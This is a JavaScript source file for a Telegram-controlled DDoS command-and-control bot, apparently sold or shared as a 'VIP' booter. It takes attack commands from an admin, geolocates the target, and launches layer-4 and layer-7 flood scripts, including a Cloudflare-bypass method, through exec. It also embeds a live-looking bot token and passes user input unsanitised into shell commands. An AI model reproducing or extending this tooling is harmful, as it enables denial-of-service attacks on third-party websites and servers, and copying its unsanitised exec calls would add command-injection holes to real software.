/**
 * NETHERSTAR SUPREME C&C - VIP EDITION
 * VERSION: 3.0 PRIVATE
 * OWNER: NHẬT ĐẸP TRAI (t.me/nhatdz29)
 */

const { exec } = require('child_process');
const TelegramBot = require('node-telegram-bot-api');
const dns = require('dns');
const axios = require('axios');

// ================= [ THIẾT LẬP HỆ THỐNG ] =================
const token = '8725630191:AAHOwTPE11tjHiOjJ2JN4o0HuicV0C8GOfU';
const adminID = 8522281788; 
const bot = new TelegramBot(token, { polling: true });

let ongoingAttacks = [];
const startTime = Date.now();
const ATTACK_GIF = 'https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJueXF6bmZ6bmZ6bmZ6bmZ6bmZ6bmZ6bmZ6bmZ6bmZ6bmZ6bmZ6JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/l41lTjJp9p6m8nKms/giphy.gif';

// ================= [ MENU VIP ] =================
const vipMenu = {
    reply_markup: {
        inline_keyboard: [
            [{ text: "🔥 LAYER 7 (HTTP/S)", callback_data: 'm_l7' }, { text: "⚡ LAYER 4 (TCP/UDP)", callback_data: 'm_l4' }],
            [{ text: "🛰 ĐANG CÀN QUÉT", callback_data: 'ongoing' }, { text: "💎 INFO SERVER", callback_data: 'info_server' }],
            [{ text: "⏳ UPTIME", callback_data: 'uptime' }, { text: "❌ DỪNG HỎA LỰC", callback_data: 'stop' }],
            [{ text: "💬 LIÊN HỆ CHỦ NHÂN", url: 'https://t.me/nhatdz29' }]
        ]
    }
};

bot.onText(/\/(start|help)/, (msg) => {
    if (msg.from.id !== adminID) return bot.sendMessage(msg.chat.id, "⚠️ **ACCESS DENIED!**\nMày không đủ thẩm quyền để điều khiển hệ thống này.");
    
    bot.sendMessage(msg.chat.id, 
        `👑 **WELCOME TO SUPREME C&C** 👑\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `👤 **Owner:** \`Nhật đẹp trai\`\n` +
        `🛡 **Status:** \`Ready to strike\`\n` +
        `🛠 **Version:** \`3.0 Peak\`\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `Hệ thống hỏa lực đã sẵn sàng phục vụ Đại ca.`, 
    vipMenu);
});

bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    if (query.from.id !== adminID) return;

    if (query.data === 'm_l7') bot.sendMessage(chatId, "🚀 **VIP L7:** \`/attack <URL> <Time> <Method>\`\n\n*Methods:* \`vip-browser, tls, cf-bypass, post-load\`", {parse_mode: 'Markdown'});
    if (query.data === 'm_l4') bot.sendMessage(chatId, "🛡 **VIP L4:** \`/attack <IP> <Port> <Time> <Method>\`\n\n*Methods:* \`udp, vulkan, ack, stomp\`", {parse_mode: 'Markdown'});
    if (query.data === 'ongoing') sendOngoing(chatId);
    if (query.data === 'uptime') sendUptime(chatId);
    if (query.data === 'stop') stopAll(chatId);
    
    if (query.data === 'info_server') {
        const res = await axios.get('http://ip-api.com/json/').catch(() => ({data:{}}));
        bot.sendMessage(chatId, 
            `🛰 **SERVER INFOMATION**\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `🌐 **IP:** \`${res.data.query}\`\n` +
            `🏢 **ISP:** \`${res.data.isp}\`\n` +
            `📍 **LOC:** \`${res.data.city}, ${res.data.country}\`\n` +
            `⚡ **CPU:** \`Optimized for High Load\``
        );
    }
});

// ================= [ LOGIC TẤN CÔNG ĐA NHIỆM ] =================
bot.onText(/\/attack (.+)/, async (msg, match) => {
    if (msg.from.id !== adminID) return;
    const args = match[1].split(' ');
    let target, port, time, method;

    if (args[0].startsWith('http')) {
        target = args[0]; time = args[1]; method = args[2];
        port = target.startsWith('https') ? '443' : '80';
    } else {
        target = args[0]; port = args[1]; time = args[2]; method = args[3];
    }

    if (!target || !time || !method) return bot.sendMessage(msg.chat.id, "❌ **Sai cú pháp!** Vui lòng kiểm tra lại.");
    const m = method.toLowerCase();
    const host = target.replace(/^https?:\/\//, '').split('/')[0];

    dns.lookup(host, async (err, address) => {
        const ipTarget = address || "N/A";
        let targetDetail = "";

        try {
            const res = await axios.get(`http://ip-api.com/json/${ipTarget}?fields=status,message,continent,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
            const i = res.data;
            targetDetail = 
                `🌍 **Vị trí:** \`${i.city}, ${i.country} (${i.continent})\`\n` +
                `🏢 **Nhà mạng:** \`${i.isp}\`\n` +
                `🛡 **Tổ chức:** \`${i.org || 'N/A'}\`\n` +
                `🛰 **Tọa độ:** \`${i.lat}, ${i.lon}\``;
        } catch (e) {
            targetDetail = "⚠️ *Không thể truy xuất dữ liệu tình báo.*";
        }

        const commands = {
            'udp': `./udp_flood ${target} ${port} ${time}`,
            'vulkan': `sudo ./vulkan_udp ${target} ${port} ${time}`,
            'ack': `sudo ./ack_flood ${target} ${port} ${time}`,
            'stomp': `python3 raw_stomp.py ${target} ${port} ${time}`,
            'vip-browser': `node vip_browser_v2.js ${target} ${time}`,
            'tls': `node http_flood.js ${target} ${time}`,
            'cf-bypass': `node cf_bypass.js ${target} ${time}`,
            'post-load': `node post_load.js ${target} ${time}`
        };

        if (commands[m]) {
            const endTime = new Date(Date.now() + time * 1000).toLocaleTimeString('vi-VN');
            const attackInfo = { target, method: m, time };
            ongoingAttacks.push(attackInfo);
            setTimeout(() => { ongoingAttacks = ongoingAttacks.filter(a => a !== attackInfo); }, time * 1000);

            await bot.sendAnimation(msg.chat.id, ATTACK_GIF, {
                caption: 
                    `🚀 **HỎA LỰC ĐÃ KHAI HỎA (PEAK)**\n` +
                    `━━━━━━━━━━━━━━━━━━\n` +
                    `🎯 **Mục tiêu:** \`${target}\`\n` +
                    `🌐 **IP Đích:** \`${ipTarget}\`\n` +
                    `${targetDetail}\n` +
                    `━━━━━━━━━━━━━━━━━━\n` +
                    `⚡ **Method:** \`${m.toUpperCase()}\`\n` +
                    `⏱ **Duration:** \`${time}s\`\n` +
                    `🔚 **Kết thúc lúc:** \`${endTime}\`\n` +
                    `━━━━━━━━━━━━━━━━━━\n` +
                    `📊 [KIỂM TRA TRẠNG THÁI WEBSITE](https://check-host.net/check-http?host=${target})\n\n` +
                    `👤 **Commander:** [Nhật đẹp trai](t.me/nhatdz29)`,
                parse_mode: 'Markdown'
            });
            
            console.log(`[ATTACK] ${m.toUpperCase()} launched on ${target} by Nhật đẹp trai`);
            exec(commands[m]);
        } else {
            bot.sendMessage(msg.chat.id, "❌ **Lỗi:** Method không hợp lệ!");
        }
    });
});

function stopAll(chatId) {
    const scripts = "vip_browser_v2.js http_flood.js cf_bypass.js post_load.js udp_flood vulkan_udp ack_flood raw_stomp.py slow_dead.py";
    scripts.split(' ').forEach(s => exec(`pkill -f ${s}`));
    ongoingAttacks = [];
    bot.sendMessage(chatId, "🛑 **QUYẾT ĐỊNH THU QUÂN!**\nToàn bộ hỏa lực đã được rút về. Bot vẫn trực chiến!");
}

function sendOngoing(chatId) {
    if (ongoingAttacks.length === 0) return bot.sendMessage(chatId, "⭕ **Hệ thống trống:** Không có mục tiêu nào bị vả.");
    let txt = "🛰 **CÁC CHIẾN DỊCH ĐANG DIỄN RA:**\n━━━━━━━━━━━━━━━━━━\n";
    ongoingAttacks.forEach((a, i) => {
        txt += `${i + 1}. 🎯 \`${a.target}\`\n   └ ⚡ Method: \`${a.method.toUpperCase()}\`\n`;
    });
    bot.sendMessage(chatId, txt, { parse_mode: 'Markdown' });
}

function sendUptime(chatId) {
    const uptime = Math.floor((Date.now() - startTime) / 60000);
    const h = Math.floor(uptime / 60);
    const m = uptime % 60;
    bot.sendMessage(chatId, `⏳ **Hệ thống đã online được:** \`${h} giờ ${m} phút\``);
}
